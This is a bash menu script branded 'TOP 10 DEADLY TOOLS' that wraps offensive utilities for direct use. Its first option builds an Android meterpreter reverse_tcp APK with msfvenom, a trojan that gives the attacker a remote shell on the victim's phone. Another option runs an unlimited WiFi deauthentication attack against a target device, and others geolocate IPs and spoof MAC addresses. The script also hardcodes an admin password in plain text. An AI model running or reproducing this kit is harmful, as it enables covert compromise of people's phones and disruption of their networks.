#!/bin/bash
# xxszmsx TOP 10 | BY: STUDIO
RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'

# لوحة الأدمن (مخصصة لك بكلمة السر)
admin_access() {
    read -s -p "[?] Enter Admin Password: " p; echo ""
    if [ "$p" == "mazen2014" ]; then
        echo -e "${GREEN}Welcome Master Mazen. Opening Editor...${NC}"
        nano xxszmsx.sh
    else
        echo -e "${RED}Unauthorized Access!${NC}"; sleep 2
    fi
}

while true; do
    clear
    echo -e "${RED}██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo "╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo " ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo " ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo "   [!] TOP 10 DEADLY TOOLS | POWERED BY: STUDIO      "
    echo "-----------------------------------------------------"
    echo -e "1) Build Android Hacker (.apk)  6) SQL Injection Scanner"
    echo -e "2) Precise IP & Map Tracker     7) Social Media Hunt"
    echo -e "3) WiFi Monitor Mode (Start)    8) Phone Info Lookup"
    echo -e "4) WiFi Deauth (Disconnect)     9) [!] ADMIN PANEL [!]"
    echo -e "5) MAC Address Randomizer       10) UPDATE & CLEAN"
    echo "-----------------------------------------------------"
    echo "0) Exit"
    read -p "Studio >> " choice

    case $choice in
        1) # صنع الفيروس
           read -p "Your IP (LHOST): " lh; read -p "Port: " lp
           echo -e "${RED}[*] Creating mazen_hacker.apk...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
           echo -e "${GREEN}[+] Done! Find mazen_hacker.apk in folder.${NC}" ;;
        2) # تتبع IP
           read -p "IP: " tip; curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
        3) sudo airmon-ng start wlan0 ;;
        4) read -p "Target MAC: " tmac; read -p "Gateway MAC: " gmac; sudo aireplay-ng --deauth 0 -a $gmac -c $tmac wlan0mon ;;
        5) read -p "Interface (eth0/wlan0): " iface; sudo macchanger -r $iface ;;
        9) admin_access ;;
        10) git pull origin main; echo -e "${GREEN}Updated!${NC}"; sleep 1 ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done

